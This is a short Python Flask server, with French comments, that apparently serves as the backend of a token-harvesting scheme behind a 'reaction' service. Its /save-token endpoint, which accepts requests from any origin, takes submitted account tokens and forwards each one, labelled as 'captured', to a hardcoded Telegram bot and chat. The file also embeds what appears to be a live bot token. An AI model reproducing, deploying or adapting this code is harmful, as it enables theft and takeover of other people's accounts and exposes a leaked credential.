import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Tes paramètres Telegram
TOKEN_BOT = "8632263179:AAFDjyU6d4eTCMgg4wM4xB1sDBGmWEMod2s"
CHAT_ID = "7129218282"

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=10)
    except Exception as e:
        print(f"Erreur Telegram: {e}")

@app.route('/')
def home():
    return "SERVEUR REACTION VRAI GASY ACTIF", 200

@app.route('/save-token', methods=['POST'])
def save_token():
    try:
        data = request.get_json()
        token = data.get('token')
        if token:
            # Envoi direct du Token sur ton Telegram
            send_telegram(f"🚀 NOUVEAU TOKEN CAPTURÉ :\n\n{token}")
            return jsonify({"status": "ok"}), 200
        return jsonify({"status": "error"}), 400
    except Exception as e:
        return jsonify({"status": "exception", "msg": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
